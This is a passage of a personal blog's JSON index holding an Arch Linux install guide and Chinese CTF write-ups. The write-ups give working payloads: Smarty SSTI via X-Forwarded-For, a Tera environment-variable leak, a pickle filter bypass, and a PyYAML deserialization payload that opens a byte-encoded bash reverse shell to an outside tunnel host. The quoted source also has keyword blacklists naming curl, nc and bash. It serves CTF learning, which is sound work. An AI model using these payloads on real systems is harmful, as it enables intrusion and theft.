","date":"2025-06-01T10:29:18+08:00","permalink":"https://Oight.github.io/p/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Python反序列化"},{"content":"安装了下arch双系统，真不好安啊，现把所有需要用到的代码写在这\r前期准备：\r1 2 1.制作好系统盘，在制作系统盘时需注意分区类型使用GPT，然后在主板关闭安全启动 2开机时使用U盘启动 无线网卡连接网络（有线可以略过）\r1 2 3 4 5 6 7 8 1.iwctl 2.device list (列出所有WIFI设备) 3.station [网卡名称] scan (扫描网络) 4.station [网卡名称] get-networks (显示所有网络) 5.station [网卡名称] connect [WIFI名称] 输入密码 Ctrl + d 退出 ping一下看看是否连接到网络 （ping www.baidu.com） 连上网后，更新系统时间\r1.timedatectl (更新系统时间)\n分区\r分区\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 1.fdisk -l (查看自己分区) 找到我们要安装的硬盘，单 nvme 盘为 /dev/nvme0n1;单 sata 盘为 /dev/sda1 2.cfdisk + [你的硬盘] 3.Type 选择第一个 efi system 4.Write 5.选中分出来的空间，选择 new，创建根分区，输入分区大小（不小于22G） 5.选中剩下的空余空间，选择new ，创建 home 分区，输入分区大小 6.选中剩下的空余空间，选择 new ,创建 swap 交换空间 （类似于 win 的虚拟内存） 7.Sort 排下序 8.选中 home 分区，Type 选择 linux home 9.选中 swap 分区，Type 选择 linux swap 10.Write 写入 11.Quit 退出 12.再次执行 fdisk -l 看看是否分好 格式化分区\r1 2 3 4 5 1.mkfs.[文件系统] （-f）/dev/[分区编号] 例： mkfs.btrfs -f /dev/nvme0n1p4 mkfs.ext4 /dev/nvme0n1p4 2.mkfs.btrfs -f /dev/nvme0n1p5 (格式化 home 分区) 3.mkswap /dev/nvme0n1p6 (初始化swap分区) 挂载分区\r1 2 3 4 5 6 7 一定要先挂载根分区 1.mount /dev/[根分区编号] /mnt 例：mount /dev/nvme0n1p4 /mnt 2.mount --mkdir /dev/[home分区编号] /mnt/home （挂载根分区） 3.mount --mkdir /dev/[efi分区编号] /mnt/efi （挂载efi分区） 例：mount --mkdir /dev/nvme0n1p1 /mnt/efi 4.swapon /dev/[交换空间分区编号] （挂载交换分区） 配置国内镜像源\r1 2 3 4 5 6 7 1.nano /etc/pacman.d/mirrorlist 2.在第一行添加 Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 3.Ctrl + o 保存 4.Ctrl + x 退出 5.pacman -Syy (刷新) 6.pacman -S archlinux-keyring (重新安装密钥) 安装基本系统\r1 2 1.pacstrap /mnt [软件包] base （基础系统），base-devel (工具包) 例：\n1 pacstrap /mnt base base-devel linux-zen linux-zen-headers linux-firmware networkmanager grub os-prober efibootmgr ntfs-3g amd-ucode bluez bluez-utils nano 一路回车就可以\n创建 fstab (自动挂载配置文件)\r1.genfstab -U /mnt \u0026raquo; /mnt/etc/fstab\nchroot进入系统\r1.arch-chroot /mnt\n设置时区\r设置时区\r1.ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n设置硬件时间\r1.hwclock –systohc\n本地化\r编辑locale.gen\r1 2 1.nano /etc/locale.gen {删除 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 前的\u0026#34;#\u0026#34;} 2.locale-gen (生成locale) 编辑locale.conf:\r1.nano /etc/locale.conf {添加 LANG=en_US.UTF-8}\n设置主机名\r设置主机名\r1.nano /etc/hostname\n设置 root 密码\r1.passwd\n设置普通用户\r1.useradd -m -G wheel [用户名]\n为用户创建密码\r1.passwd [用户名]\n编辑 sudoers 赋予用户 root 权限\r1.nano /etc/sudoers {删除 %wheel ALL=(ALL:ALL) ALL前的“#”}\n启用服务\r网络\r1.systemctl enable NetworkManager\n蓝牙\r1.systemctl enable bluetooth\n编辑 grub\r编辑 grub\r1.nano /etc/default/grub {去掉 GRUB_DISABLE_OS_PROBER=false 前的“#”}\n安装 grub 服务\r1 2 1.grub-install --target=x86_64-efi --efi-directory=/efi --bootloader-id=grub 2.grub-mkconfig -o /boot/grub/grub.cfg (更新 grub 向导) 安装KDE\rsudo pacman -S plasma\n开机自启显示管理\rsystemctl enable sddm\n其他安装\rpacman -S konsole ark dolphin kate\n完成安装\r退出\rexit\n重启\rreboot\n进入系统\r1 alt + Ctrl + T 打开终端 更新 grub\rsudo grub-mkconfig -o /boot/grub/grub.cfg\n安装中文字体\rsudo pacman -S adobe-source-han-sans-cn-fonts\n设置语言后重启\n配置国内源\r配置国内源\r1 2 3 4 5 6 sudo nano /etc/pacman.conf 开启32位库，{去掉 [multilib]及下一行前的 \u0026#34;#\u0026#34;} 然后在下面添加： Server = https://mirrors.tuna.tsinghua.edu.cn/archlinuxcn/$arch (清华源)或 Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch (科大源)或 Server = https://repo.huaweicloud.com/archlinux/$repo/os/$srch (华为源) 刷新软件包\rsudo pacman -Syy\n导入密钥\rsudo pacman -S archlinuxcn-keyring\n软件商店软件源安装（可选）\rsudo pacman -S archlinux-appstream-data packagekit-qt6 fwupd\n安装 aur 助手 yay\r1 2 sudo pacman -S yay yay -Syy 安装中文输入法参照 ArchWiKi\r推荐Fcitx5\nyay\r使用 Yay 进行包管理\rYay 遵循与 pacman 类似（但不相同）的命令结构。所以你用 Yay 管理 AUR 包应该不难。\n搜索软件包：\n1 yay search_term 安装软件包：\n1 yay -S package_name 删除软件包：\n1 yay -R package_name 要删除包及其依赖项：\n1 yay -Rns package_name 仅升级 AUR 包：\n1 yay -Sua Yay 还能够升级非 AUR 软件包。上面的 a 标志将其限制为 AUR。\n将 Yay 升级到新版本\r现在，你可能想知道如何将 Yay 升级到可用的新版本。\n答案是你不需要做任何特别的事情。当你运行以下命令时，Yay 可以自行更新：\n1 yay -Sua ","date":"2025-06-01T10:29:03+08:00","image":"https://moegirl.uk/images/c/c9/Archlinux_chan.png?20221105073224","permalink":"https://Oight.github.io/p/archlinux/","title":"Archlinux"},{"content":"WEB\rflow\r创建实例，提示：\n1 2 3 Welcome to My Flask App This is a simple web app using Flask. 给出了任意文件读功能\n看看 flask 应用的目录结构：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 my_flask_app/ │ ├── app/ │ ├── __init__.py │ ├── routes/ │ │ ├── __init__.py │ │ ├── main.py │ │ └── auth.py │ ├── models/ │ │ ├── __init__.py │ │ └── user.py │ ├── templates/ │ │ ├── layout.html │ │ └── home.html │ └── static/ │ ├── css/ │ └── js/ │ ├── config.py ├── requirements.txt ├── migrations/ │ └── ... └── run.py 所以源码应该在 /app/main.py 中\n读源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from flask import Flask, request, render_template_string, abort app = Flask(__name__) HOME_PAGE_HTML = \u0026#39;\u0026#39;\u0026#39; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Flask Web Application\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;display-4 text-center\u0026#34;\u0026gt;Welcome to My Flask App\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;lead text-center\u0026#34;\u0026gt;This is a simple web app using Flask.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/file?f=example.txt\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Read example.txt\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/\u0026#39;) def index(): return render_template_string(HOME_PAGE_HTML) @app.route(\u0026#39;/file\u0026#39;) def file(): file_name = request.args.get(\u0026#39;f\u0026#39;) if not file_name: return \u0026#34;Error: No file parameter provided.\u0026#34;, 400 try: with open(file_name, \u0026#39;r\u0026#39;) as file: content = file.read() return content except FileNotFoundError: return abort(404, description=\u0026#34;File not found.\u0026#34;) except Exception as e: return f\u0026#34;Error reading file.\u0026#34;, 500 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#34;127.0.0.1\u0026#34;, port=8080) 尝试读环境变量，查资料得知，Linux 系统存在如下敏感路径（在存在获取任意文件读时）\n1 /etc/passwd 该文件储存了该 Linux 系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为 用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 Shell （以冒号作为分隔符）\n1 /proc/self proc 是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过 /proc/PID 可以访问对应 PID 的进程内核数据，而 /proc/self 访问的是当前进程的内核数据。\n1 /proc/self/cmdline 该文件包含的内容为当前进程执行的命令行参数。\n1 /proc/self/mem /proc/self/mem 是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合 /proc/self/maps 中的偏移地址进行读取。通过参数 start 和 end 及偏移地址值读取内容。\n1 /proc/self/maps /proc/self/maps 包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。\n1 flask-session结构 flask_session 是 flask 框架实现 session 功能的一个插件。其 session 结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 “.”来进行分隔。flask_session 默认 session 的储存是在用户 Cookie 中。但也可以指定存储在数据库，缓存中间件，服务器本地文件等等之中。\n查阅资料，得知 environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看 environ 目录来获取指定进程的环境变量信息\n因此/file?f=/proc/1/environ读到flag\n参考：\nProc 目录在 CTF 中的利用\n攻防世界-cat_cat_new（flask_session伪造、/proc/self/文件夹）\nFlask 项目结构\nDASCTF 2024 十月挑战赛\nDASCTF十月赛其他题太过于抽象了 ~ \u0026gt;_\u0026lt; ~\n[CISCN2019 华东南赛区] Web11 1\r刚刚进入实例,一时不知所措\n后面看到XFF\n使用BP抓包,没发现什么特别的\n在页面底部发现一行字：Build With Smarty !\n查阅资料得知, Smarty 是 PHP 的模板引擎，有助于将表示 (HTML/CSS) 与应用程序逻辑分离。在 3.1.42 和 4.0.2 版本之前，模板作者可以通过制作恶意数学字符串来运行任意 PHP 代码。如果数学字符串作为用户提供的数据传递给数学函数，则外部用户可以通过制作恶意数学字符串来运行任意 PHP 代码。用户应升级到版本 3.1.42 或 4.0.2 以接收补丁。\nCVE-2021-29454——Smarty模板注入\n所以我们可以尝试注入如下代码:\n1 string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026#34;\u0026lt;?php+phpinfo();\u0026#34;,$s)} 但传递这个Payload需要注入点,这里只有XFF可以入手\nBP这样写:\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET / HTTP/1.1 Host: node5.buuoj.cn:25829 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br DNT: 1 Sec-GPC: 1 Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i X-Forwarded-For: string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026#34;\u0026lt;?php+phpinfo();\u0026#34;,$s)} Content-Length: 2 发送两次,发现读到环境变量,代码执行成功\n然后XFF传递string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026quot;\u0026lt;?php+eval(system('ls /'));\u0026quot;,$s)}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 bin dev etc flag home lib media mnt opt proc root run sbin srv sys usr var 读到存在flag目录,直接 cat /flag\nXFF payload: string:{$s=$smarty.template_object-\u0026gt;smarty}{$fp=$smarty.template_object-\u0026gt;compiled-\u0026gt;filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,\u0026quot;\u0026lt;?php+eval(system('cat /flag'));\u0026quot;,$s)}\n得到flag\nReverse\r[BJDCTF2020]JustRE\rIDA打开\nmain函数中似乎没有什么有用的东西\n点击菜单栏的“View”（视图）\u0026gt;“Open subviews”（打开子视图）\u0026gt;“Strings”（字符串）打开字符串窗口\n发现BJD{%d%d2069a45792d233ac},跟进看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 INT_PTR __stdcall DialogFunc(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4) { CHAR String[100]; // [esp+0h] [ebp-64h] BYREF if ( a2 != 272 ) { if ( a2 != 273 ) return 0; if ( (_WORD)a3 != 1 \u0026amp;\u0026amp; (_WORD)a3 != 2 ) { sprintf(String, Format, ++dword_4099F0); if ( dword_4099F0 == 19999 ) { sprintf(String, \u0026#34; BJD{%d%d2069a45792d233ac}\u0026#34;, 19999, 0); SetWindowTextA(hWnd, String); return 0; } SetWindowTextA(hWnd, String); return 0; } EndDialog(hWnd, (unsigned __int16)a3); } return 1; } 这里判断是否点击次数是19999次，Format 点进去是‘您已经点了 %d 次’，说明dword_4099F0存的是点击次数。然后判断是否点击19999次，输出BJD{1999902069a45792d233ac}\n说明flag是BJD{1999902069a45792d233ac}\n参考：\n[BJDCTF2020]JustRE\n","date":"2025-06-01T10:28:42+08:00","image":"https://c.img.dasctf.com/LightPicture/2024/10/993ae115bf4e5120.png","permalink":"https://Oight.github.io/p/dasctf2024%E5%8D%81%E6%9C%88%E8%B5%9B/","title":"DASCTF2024十月赛"},{"content":"Chicken\r1.签到题\r进入容器发现会先在https://game.wetolink.com/停留一段时间然后会跳转到https://game.gcsis.cn/compete/home/8c3adb14b154482\n一开始以为是类似于需要“买东西”之类的WEB题，需要获取管理员权限，更改数据之类的操作\n后根据hint，发现只需要扫一下https://game.wetolink.com/，发现robots.txt，访问robots.txt得到flag\n2.西湖论剑邀请函获取器\r因为题目里有上传图片文件的功能以及会有管理员看见的字样，以为是XSS，但没发现注入点\n后hint中说“队名好像可以 81 ”、“是 Rust 吗（喜）”、 “不用RCE，拿到环境变量FLAG的内容即可。”\n在FLAG兑换区域输入”81“,返回“81”说明存在SSTI\n由题可知，这道题是RUST写的。查询资料得知RUST中常见的WEB模板有：\nTera\n1 Tera 是Rust中一个高性能的模板引擎，类似于Jinja2（Python）和Liquid（Ruby）。它支持复杂的模板功能，但如果输入没有得到适当的验证，攻击者可能会通过注入模板代码来触发SSTI漏洞。 Tera GitHub\nAskama\n1 Askama 是另一个Rust模板引擎，采用编译时模板渲染。它是基于Rust的类型系统，模板是在编译时进行检查的，这意味着在某些情况下可以避免SSTI攻击，因其不允许任意的动态代码执行。 Askama GitHub\nHandlebars\n1 Handlebars 是一个流行的模板引擎，Rust中的实现通常为 handlebars-rust。与其他模板引擎一样，如果不当使用，也可能导致SSTI漏洞。 Handlebars GitHub\n查询得知这道题使用Tera模板\nTera的SSTI\n在其中有\n1 2 3 So, the session store used by the application is a CookieStore, where the secret used comes from the SECRET environment variable! So, if we can leak the SECRET env var, we could sign our own sessions with arbitrary data (since the complete session data is stored in the cookie). Okay, let\u0026#39;s do this. Following Tera\u0026#39;s format, we can leak the session with {{ get_env(name=\u0026#34;SECRET\u0026#34;) }}: 可以发现这道题也是没法RCE但可以泄露环境变量，但显然CORCTF中的这道题更难（毕竟DASCTF中的这道签到题只是其中的一个知识点）\n所以我们知道在Tera 中利用SSTI读取环境变量可以使用 get_env 这个内置函数，其格式为：\n1 {{ get_env(name=\u0026#34;SECRET\u0026#34;) }} 我们要读FLAG的内容，所以payload为\n1 {{ get_env(name=\u0026#34;FLAG\u0026#34;) }} 得到flag\nWEB\rconst_python\r有一说一，这次 const_python 和 yaml_matser 两道WEB题都没回显，第一次做这样的题，所以很不适应\nhint提示在 /src 中可以读到源码，进入其中直接得到一部分源码，还有一部分源码藏在HTML注释里，源码是用Python写的\n源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 plaintext import builtins import io import sys import uuid from flask import Flask, request,jsonify,session import pickle import base64 app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) class User: def __init__(self, username, password, auth=\u0026#39;ctfer\u0026#39;): self.username = username self.password = password self.auth = auth password = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) Admin = User(\u0026#39;admin\u0026#39;, password,\u0026#34;admin\u0026#34;) @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#34;Welcome to my application\u0026#34; @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def post_login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username == \u0026#39;admin\u0026#39; : if password == admin.password: session[\u0026#39;username\u0026#39;] = \u0026#34;admin\u0026#34; return \u0026#34;Welcome Admin\u0026#34; else: return \u0026#34;Invalid Credentials\u0026#34; else: session[\u0026#39;username\u0026#39;] = username return \u0026#39;\u0026#39;\u0026#39; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;!-- /src may help you\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/ppicklee\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def ppicklee(): data = request.form[\u0026#39;data\u0026#39;] sys.modules[\u0026#39;os\u0026#39;] = \u0026#34;not allowed\u0026#34; sys.modules[\u0026#39;sys\u0026#39;] = \u0026#34;not allowed\u0026#34; try: pickle_data = base64.b64decode(data) for i in {\u0026#34;os\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#39;setstate\u0026#39;, \u0026#34;globals\u0026#34;, \u0026#39;exec\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;template\u0026#39;, \u0026#39;render\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;requests\u0026#39;, \u0026#39;exit\u0026#39;, \u0026#39;pickle\u0026#39;,\u0026#34;class\u0026#34;,\u0026#34;mro\u0026#34;,\u0026#34;flask\u0026#34;,\u0026#34;sys\u0026#34;,\u0026#34;base\u0026#34;,\u0026#34;init\u0026#34;,\u0026#34;config\u0026#34;,\u0026#34;session\u0026#34;}: if i.encode() in pickle_data: return i+\u0026#34; waf !!!!!!!\u0026#34; pickle.loads(pickle_data) return \u0026#34;success pickle\u0026#34; except Exception as e: return \u0026#34;fail pickle\u0026#34; @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def admin(): username = session[\u0026#39;username\u0026#39;] if username != \u0026#34;admin\u0026#34;: return jsonify({\u0026#34;message\u0026#34;: \u0026#39;You are not admin!\u0026#39;}) return \u0026#34;Welcome Admin\u0026#34; @app.route(\u0026#39;/src\u0026#39;) def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=False, port=5000) 发现一共三个路由， /src、/ppicklee 和 /admin\n进入/admin 路由中提示没有权限，以为是要通过更改SESSID获取管理员权限，来得到flag 但是这道题三个路由中都没有Cooike，无法成功\n再读源码，发现可以/ppicklee 路由中存在防火墙，所以绕过防火墙，看看能否从 /ppicklee 路由中得到什么 使用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import pickle import base64 # 使用 subprocess 来绕过 class Exploit: def __reduce__(self): return (getattr, (\u0026#39;subprocess\u0026#39;, \u0026#39;Popen\u0026#39;, (\u0026#39;cat /flag\u0026#39;,))) # 创建恶意对象 exploit_obj = Exploit() # 将恶意对象序列化为 pickle 数据 pickled_data = pickle.dumps(exploit_obj) # 编码为 base64 encoded_data = base64.b64encode(pickled_data).decode() print(encoded_data) 使用POSTman传参，发现只能得到 success pickle 无法得到flag，遂放弃\n后由WP可知，因为 src 路由会读取 app.py 内容并输出，所以可以尝试先读取flag，再把flag的内容写入到 app.py\n可以使用pker：\nPker\n1 2 3 4 5 6 7 8 9 10 getattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) open = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;open\u0026#39;) flag=open(\u0026#39;/flag\u0026#39;) read=getattr(flag, \u0026#39;read\u0026#39;) f=open(\u0026#39;./app.py\u0026#39;,\u0026#39;w\u0026#39;) write=getattr(f, \u0026#39;write\u0026#39;) fff=read() write(fff) return 在 ppicklee 路由中传参，然后在 src 路由中得到flag\n这道题涉及pickle反序列化，在这里粘一个pickle反序列化相关的博客\nPickle反序列化初探\nyaml_matser\r源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 plaintext import os import re import yaml from flask import Flask, request, jsonify, render_template app = Flask(__name__, template_folder=\u0026#39;templates\u0026#39;) UPLOAD_FOLDER = \u0026#39;uploads\u0026#39; os.makedirs(UPLOAD_FOLDER, exist_ok=True) def waf(input_str): blacklist_terms = {\u0026#39;apply\u0026#39;, \u0026#39;subprocess\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;map\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;sleep\u0026#39;, \u0026#39;setstate\u0026#39;, \u0026#39;command\u0026#39;,\u0026#39;static\u0026#39;,\u0026#39;templates\u0026#39;,\u0026#39;session\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;builtins\u0026#39; \u0026#39;run\u0026#39;, \u0026#39;ntimeit\u0026#39;, \u0026#39;bash\u0026#39;, \u0026#39;zsh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;env\u0026#39;, \u0026#39;before_request\u0026#39;, \u0026#39;after_request\u0026#39;, \u0026#39;error_handler\u0026#39;, \u0026#39;add_url_rule\u0026#39;,\u0026#39;teardown_request\u0026#39;,\u0026#39;teardown_appcontext\u0026#39;,\u0026#39;\\\\u\u0026#39;,\u0026#39;\\\\x\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;base64\u0026#39;,\u0026#39;join\u0026#39;} input_str_lower = str(input_str).lower() for term in blacklist_terms: if term in input_str_lower: print(f\u0026#34;Found blacklisted term: {term}\u0026#34;) return True return False file_pattern = re.compile(r\u0026#39;.*\\.yaml$\u0026#39;) def is_yaml_file(filename): return bool(file_pattern.match(filename)) @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#39;\u0026#39;\u0026#39; Welcome to DASCTF X 0psu3 \u0026lt;br\u0026gt; Here is the challenge \u0026lt;a href=\u0026#34;/upload\u0026#34;\u0026gt;Upload file\u0026lt;/a\u0026gt; \u0026lt;br\u0026gt; Enjoy it \u0026lt;a href=\u0026#34;/Yam1\u0026#34;\u0026gt;Yam1\u0026lt;/a\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def upload_file(): if request.method == \u0026#39;POST\u0026#39;: try: uploaded_file = request.files[\u0026#39;file\u0026#39;] if uploaded_file and is_yaml_file(uploaded_file.filename): file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename) uploaded_file.save(file_path) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;uploaded successfully\u0026#34;}), 200 else: return jsonify({\u0026#34;error\u0026#34;: \u0026#34;Just YAML file\u0026#34;}), 400 except Exception as e: return jsonify({\u0026#34;error\u0026#34;: str(e)}), 500 return render_template(\u0026#39;upload.html\u0026#39;) @app.route(\u0026#39;/Yam1\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def Yam1(): filename = request.args.get(\u0026#39;filename\u0026#39;,\u0026#39;\u0026#39;) if filename: with open(f\u0026#39;uploads/{filename}.yaml\u0026#39;, \u0026#39;rb\u0026#39;) as f: file_content = f.read() if not waf(file_content): test = yaml.load(file_content) print(test) return \u0026#39;welcome\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run() 进入发现有文件上传功能，而且只能上传 .yaml 文件\n一开始尝试直接输出flag，使用\n1 2 3 4 5 !!python/object:__main__.MyClass args: !!python/tuple - !!python/name:globals - \u0026#34;os.system\u0026#34; - \u0026#34;echo hello\u0026#34; 无果\n由WP得知这是一道pyYaml反序列化\nPyYaml反序列化漏洞详解\n黑名单中采用了列举法来防止攻击，可以从这里入手，发现没有禁exec\n上传内容：\n1 2 3 4 5 6 !!python/object/new:type args: [\u0026#39;z\u0026#39;, !!python/tuple [], {\u0026#39;extend\u0026#39;: !!python/name:exec }] listitems: \u0026#39;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98, 97, 115, 104, 32, 45, 105, 32, 62, 38, 32, 47, 100, 101, 118, 47, 116, 99, 112, 47, 51, 49, 46, 116, 99, 112, 46, 99, 112, 111, 108, 97, 114, 46, 116, 111, 112, 32, 49, 51, 49, 57, 48, 32, 48, 62, 38, 49] ).decode())\u0026#39; #__import__(\u0026#39;os\u0026#39;).__getattribute__(\u0026#39;system\u0026#39;)(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/31.tcp.cpolar.top 13190 0\u0026gt;\u0026amp;1\u0026#39;) 建立反向shell，得到flag\nReverse\rtryre\r根据提供的代码片段，可以看到这是一个混合了 Base64 编码、异或操作和字符映射的加密验证逻辑。我们需要逆向每一步操作来编写解密脚本，以还原原始的输入字符串。 以下是解密过程的分步解析和 Python 脚本实现: 解密步骤解析 1.Base64 映射表(aZyxabcdefghijk) 自定义的 Base64 字符映射表:\n1 ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/ 加密时使用了这个映射表对数据进行编码，解密时需要反向查找映射。 2.加密数据(v21): 加密的目标字符串为:\n1 M@ASL3MF~uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSOhNCX7TVL3UFMeHi2? 3.Base64 编码逻辑 数据被分为 3字节一组，经过位移和分组操作映射到 Base64 表的索引中。 解密时需要逆向这些位移和组装操作，还原原始的字节序列。\n4.异或操作: 在加密过程中，最终的 Base64 编码结果被逐字节与 2进行异或操作。 解密时需要再次逐字节与 2 进行异或操作，恢复原始数据。\n验证逻辑:解密后的数据与 v21 逐字节对比，如果完全相同，则验证通过\n使用如下脚本进行解码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # 自定义 Base64 字符映射表 custom_base64 = \u0026#34;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/\u0026#34; reverse_base64 = {char: idx for idx, char in enumerate(custom_base64)} # 加密数据 encrypted = \u0026#34;M@ASL3MF`uL3ICT2IhUgKSD2IeDsICH7Hd26HhQgKSQhNCX7TVL3UFMeHi2?\u0026#34; # 解密：逐字节异或还原 def xor_decrypt(data, key=2): return \u0026#39;\u0026#39;.join(chr(ord(char) ^ key) for char in data) # 解密：Base64 自定义表解码 def custom_base64_decode(data): decoded_bytes = [] for i in range(0, len(data), 4): chunk = data[i:i + 4] # 处理填充字符 